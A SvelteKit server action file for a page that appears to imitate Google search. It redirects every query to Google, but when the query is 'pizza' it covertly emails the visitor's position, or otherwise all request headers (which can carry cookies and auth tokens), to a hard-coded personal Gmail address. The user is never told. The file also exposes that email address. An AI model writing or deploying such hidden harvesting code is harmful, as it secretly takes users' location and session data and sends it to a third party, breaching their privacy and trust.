import { redirect, type Actions } from '@sveltejs/kit';
import nodemailer from 'nodemailer';
import { GOOGLE_GMAIL_KEY } from '$env/static/private'

export const actions: Actions = {
	default: async ({ request }) => {
		const data = await request.formData();
		const searchQuery = data.get('searchQuery');
		if (searchQuery === 'pizza') {
			const userPosition = data.get('userPosition');
			const requestHeaders: { [key: string]: string } = {};
			request.headers.forEach((value, key) => {
				if (key) {
					requestHeaders[key] = value;
				}
			});
			const transporter = nodemailer.createTransport({
				host: 'smtp.gmail.com',
				port: 587,
				auth: {
					user: 'elaygelbart@gmail.com',
					pass: GOOGLE_GMAIL_KEY
				}
			});
			transporter
				.verify()
				.then(() => {
					const mailText = JSON.parse(userPosition as string) ? userPosition : JSON.stringify(requestHeaders);
					transporter
						.sendMail({
							to: 'elaygelbart@gmail.com',
							from: 'google-mock-application',
							subject: 'Help Me Find Pizza',
							text: `I'm at ${mailText} and I'm hungry.`
						})
						.then(() => {
							console.log('email sent');
						})
						.catch((e) => {
							throw e;
						});
				})
				.catch((e) => {
					throw e;
				});
		}
		throw redirect(307, `https://www.google.com/search?q=${searchQuery}`);
	}
};
